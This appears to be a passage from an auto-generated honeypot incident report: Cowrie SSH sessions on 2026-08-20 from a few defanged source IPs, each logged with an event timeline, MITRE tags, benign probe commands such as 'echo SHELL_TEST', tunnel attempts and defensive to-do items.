| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:24` | `cowrie.session.connect` |
| `2026-08-20 19:44:24` | `cowrie.client.version` |
| `2026-08-20 19:44:24` | `cowrie.client.kex` |
| `2026-08-20 19:44:24` | `cowrie.login.success` |
| `2026-08-20 19:44:25` | `cowrie.session.params` |
| `2026-08-20 19:44:25` | `cowrie.command.input` |
| `2026-08-20 19:44:25` | `cowrie.log.closed` |
| `2026-08-20 19:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6620c46417ad

| Field | Detail |
|---|---|
| **Source IP** | `117.253.130[.]123` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:24` | `cowrie.session.connect` |
| `2026-08-20 19:44:24` | `cowrie.client.version` |
| `2026-08-20 19:44:24` | `cowrie.client.kex` |
| `2026-08-20 19:44:26` | `cowrie.login.success` |
| `2026-08-20 19:44:28` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.253.130[.]123` to AbuseIPDB if not already reported
- [ ] Block `117.253.130[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d1b8737efa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:25` | `cowrie.session.connect` |
| `2026-08-20 19:44:25` | `cowrie.client.version` |
| `2026-08-20 19:44:25` | `cowrie.client.kex` |
| `2026-08-20 19:44:26` | `cowrie.login.success` |
| `2026-08-20 19:44:26` | `cowrie.session.params` |
| `2026-08-20 19:44:26` | `cowrie.command.input` |
| `2026-08-20 19:44:26` | `cowrie.log.closed` |
| `2026-08-20 19:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d5f28284c2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:26` | `cowrie.session.connect` |
| `2026-08-20 19:44:26` | `cowrie.client.version` |
| `2026-08-20 19:44:27` | `cowrie.client.kex` |
| `2026-08-20 19:44:27` | `cowrie.login.success` |
| `2026-08-20 19:44:28` | `cowrie.session.params` |
| `2026-08-20 19:44:28` | `cowrie.command.input` |
| `2026-08-20 19:44:28` | `cowrie.log.closed` |
| `2026-08-20 19:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07de1eed1b38

| Field | Detail |
|---|---|
| **Source IP** | `138.68.101[.]246` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:27` | `cowrie.session.connect` |
| `2026-08-20 19:44:27` | `cowrie.login.success` |
| `2026-08-20 19:44:27` | `cowrie.session.params` |
| `2026-08-20 19:44:32` | `cowrie.log.closed` |
| `2026-08-20 19:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.101[.]246` to AbuseIPDB if not already reported
- [ ] Block `138.68.101[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8e7eedcf55

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:28` | `cowrie.session.connect` |
| `2026-08-20 19:44:28` | `cowrie.client.version` |
| `2026-08-20 19:44:29` | `cowrie.client.kex` |
| `2026-08-20 19:44:29` | `cowrie.login.success` |
| `2026-08-20 19:44:29` | `cowrie.session.params` |
| `2026-08-20 19:44:29` | `cowrie.command.input` |
| `2026-08-20 19:44:30` | `cowrie.log.closed` |
| `2026-08-20 19:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253f876d5d73

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:30` | `cowrie.session.connect` |
| `2026-08-20 19:44:30` | `cowrie.client.version` |
| `2026-08-20 19:44:30` | `cowrie.client.kex` |
| `2026-08-20 19:44:30` | `cowrie.login.success` |
| `2026-08-20 19:44:31` | `cowrie.session.params` |
| `2026-08-20 19:44:31` | `cowrie.command.input` |
| `2026-08-20 19:44:31` | `cowrie.log.closed` |
| `2026-08-20 19:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef1639b5faad

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:31` | `cowrie.session.connect` |
| `2026-08-20 19:44:31` | `cowrie.client.version` |
| `2026-08-20 19:44:31` | `cowrie.client.kex` |
| `2026-08-20 19:44:32` | `cowrie.login.success` |
| `2026-08-20 19:44:32` | `cowrie.session.params` |
| `2026-08-20 19:44:32` | `cowrie.command.input` |
| `2026-08-20 19:44:33` | `cowrie.log.closed` |
| `2026-08-20 19:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9574d31b4b93

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:33` | `cowrie.session.connect` |
| `2026-08-20 19:44:33` | `cowrie.client.version` |
| `2026-08-20 19:44:33` | `cowrie.client.kex` |
| `2026-08-20 19:44:33` | `cowrie.login.success` |
| `2026-08-20 19:44:34` | `cowrie.session.params` |
| `2026-08-20 19:44:34` | `cowrie.command.input` |
| `2026-08-20 19:44:34` | `cowrie.log.closed` |
| `2026-08-20 19:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b72872b872bc

| Field | Detail |
|---|---|
| **Source IP** | `117.253.130[.]123` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:33` | `cowrie.session.connect` |
| `2026-08-20 19:44:34` | `cowrie.client.version` |
| `2026-08-20 19:44:34` | `cowrie.client.kex` |
| `2026-08-20 19:44:36` | `cowrie.login.success` |
| `2026-08-20 19:44:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.253.130[.]123` to AbuseIPDB if not already reported
- [ ] Block `117.253.130[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c97c365efc2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:34` | `cowrie.session.connect` |
| `2026-08-20 19:44:34` | `cowrie.client.version` |
| `2026-08-20 19:44:34` | `cowrie.client.kex` |
| `2026-08-20 19:44:34` | `cowrie.login.success` |
| `2026-08-20 19:44:35` | `cowrie.session.params` |
| `2026-08-20 19:44:35` | `cowrie.command.input` |
| `2026-08-20 19:44:35` | `cowrie.log.closed` |
| `2026-08-20 19:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afcc7fe6b8b2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:35` | `cowrie.session.connect` |
| `2026-08-20 19:44:35` | `cowrie.client.version` |
| `2026-08-20 19:44:36` | `cowrie.client.kex` |
| `2026-08-20 19:44:36` | `cowrie.login.success` |
| `2026-08-20 19:44:37` | `cowrie.session.params` |
| `2026-08-20 19:44:37` | `cowrie.command.input` |
| `2026-08-20 19:44:37` | `cowrie.log.closed` |
| `2026-08-20 19:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2b84314f43

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:37` | `cowrie.session.connect` |
| `2026-08-20 19:44:37` | `cowrie.client.version` |
| `2026-08-20 19:44:37` | `cowrie.client.kex` |
| `2026-08-20 19:44:38` | `cowrie.login.success` |
| `2026-08-20 19:44:39` | `cowrie.session.params` |
| `2026-08-20 19:44:39` | `cowrie.command.input` |
| `2026-08-20 19:44:39` | `cowrie.log.closed` |
| `2026-08-20 19:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6200eef479b9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:39` | `cowrie.session.connect` |
| `2026-08-20 19:44:39` | `cowrie.client.version` |
| `2026-08-20 19:44:39` | `cowrie.client.kex` |
| `2026-08-20 19:44:39` | `cowrie.login.success` |
| `2026-08-20 19:44:40` | `cowrie.session.params` |
| `2026-08-20 19:44:40` | `cowrie.command.input` |
| `2026-08-20 19:44:40` | `cowrie.log.closed` |
| `2026-08-20 19:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5d337e6e91

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:40` | `cowrie.session.connect` |
| `2026-08-20 19:44:40` | `cowrie.client.version` |
| `2026-08-20 19:44:41` | `cowrie.client.kex` |
| `2026-08-20 19:44:41` | `cowrie.login.success` |
| `2026-08-20 19:44:42` | `cowrie.session.params` |
| `2026-08-20 19:44:42` | `cowrie.command.input` |
| `2026-08-20 19:44:42` | `cowrie.log.closed` |
| `2026-08-20 19:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d9a1cf3bb1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:42` | `cowrie.session.connect` |
| `2026-08-20 19:44:42` | `cowrie.client.version` |
| `2026-08-20 19:44:42` | `cowrie.client.kex` |
| `2026-08-20 19:44:42` | `cowrie.login.success` |
| `2026-08-20 19:44:44` | `cowrie.session.params` |
| `2026-08-20 19:44:44` | `cowrie.command.input` |
| `2026-08-20 19:44:44` | `cowrie.log.closed` |
| `2026-08-20 19:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f84d782adbb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:44` | `cowrie.session.connect` |
| `2026-08-20 19:44:44` | `cowrie.client.version` |
| `2026-08-20 19:44:44` | `cowrie.client.kex` |
| `2026-08-20 19:44:44` | `cowrie.login.success` |
| `2026-08-20 19:44:45` | `cowrie.session.params` |
| `2026-08-20 19:44:45` | `cowrie.command.input` |
| `2026-08-20 19:44:45` | `cowrie.log.closed` |
| `2026-08-20 19:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7c76de8019

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:49` | `cowrie.session.connect` |
| `2026-08-20 19:44:49` | `cowrie.client.version` |
| `2026-08-20 19:44:50` | `cowrie.client.kex` |
| `2026-08-20 19:44:50` | `cowrie.login.success` |
| `2026-08-20 19:44:50` | `cowrie.session.params` |
| `2026-08-20 19:44:50` | `cowrie.command.input` |
| `2026-08-20 19:44:51` | `cowrie.log.closed` |
| `2026-08-20 19:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe313fe3832

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:51` | `cowrie.session.connect` |
| `2026-08-20 19:44:51` | `cowrie.client.version` |
| `2026-08-20 19:44:51` | `cowrie.client.kex` |
| `2026-08-20 19:44:51` | `cowrie.login.success` |
| `2026-08-20 19:44:52` | `cowrie.session.params` |
| `2026-08-20 19:44:52` | `cowrie.command.input` |
| `2026-08-20 19:44:52` | `cowrie.log.closed` |
| `2026-08-20 19:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5df303fe86b1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:52` | `cowrie.session.connect` |
| `2026-08-20 19:44:52` | `cowrie.client.version` |
| `2026-08-20 19:44:52` | `cowrie.client.kex` |
| `2026-08-20 19:44:53` | `cowrie.login.success` |
| `2026-08-20 19:44:53` | `cowrie.session.params` |
| `2026-08-20 19:44:53` | `cowrie.command.input` |
| `2026-08-20 19:44:53` | `cowrie.log.closed` |
| `2026-08-20 19:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54748bbe9dda

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:54` | `cowrie.session.connect` |
| `2026-08-20 19:44:54` | `cowrie.client.version` |
| `2026-08-20 19:44:54` | `cowrie.client.kex` |
| `2026-08-20 19:44:54` | `cowrie.login.success` |
| `2026-08-20 19:44:55` | `cowrie.session.params` |
| `2026-08-20 19:44:55` | `cowrie.command.input` |
| `2026-08-20 19:44:55` | `cowrie.log.closed` |
| `2026-08-20 19:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc8b5b5b9a2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:55` | `cowrie.session.connect` |
| `2026-08-20 19:44:55` | `cowrie.client.version` |
| `2026-08-20 19:44:55` | `cowrie.client.kex` |
| `2026-08-20 19:44:55` | `cowrie.login.success` |
| `2026-08-20 19:44:56` | `cowrie.session.params` |
| `2026-08-20 19:44:56` | `cowrie.command.input` |
| `2026-08-20 19:44:56` | `cowrie.log.closed` |
| `2026-08-20 19:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ac613b6961

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:56` | `cowrie.session.connect` |
| `2026-08-20 19:44:56` | `cowrie.client.version` |
| `2026-08-20 19:44:56` | `cowrie.client.kex` |
| `2026-08-20 19:44:57` | `cowrie.login.success` |
| `2026-08-20 19:44:57` | `cowrie.session.params` |
| `2026-08-20 19:44:57` | `cowrie.command.input` |
| `2026-08-20 19:44:57` | `cowrie.log.closed` |
| `2026-08-20 19:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1154d0b48c1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:03` | `cowrie.session.connect` |
| `2026-08-20 19:45:03` | `cowrie.client.version` |
| `2026-08-20 19:45:03` | `cowrie.client.kex` |
| `2026-08-20 19:45:03` | `cowrie.login.success` |
| `2026-08-20 19:45:04` | `cowrie.session.params` |
| `2026-08-20 19:45:04` | `cowrie.command.input` |
| `2026-08-20 19:45:04` | `cowrie.log.closed` |
| `2026-08-20 19:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d2df276241

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:04` | `cowrie.session.connect` |
| `2026-08-20 19:45:04` | `cowrie.client.version` |
| `2026-08-20 19:45:04` | `cowrie.client.kex` |
| `2026-08-20 19:45:04` | `cowrie.login.success` |
| `2026-08-20 19:45:05` | `cowrie.session.params` |
| `2026-08-20 19:45:05` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.log.closed` |
| `2026-08-20 19:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c93377825b1e

| Field | Detail |
|---|---|
| **Source IP** | `138.68.101[.]246` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:05` | `cowrie.session.connect` |
| `2026-08-20 19:45:05` | `cowrie.login.success` |
| `2026-08-20 19:45:06` | `cowrie.session.params` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
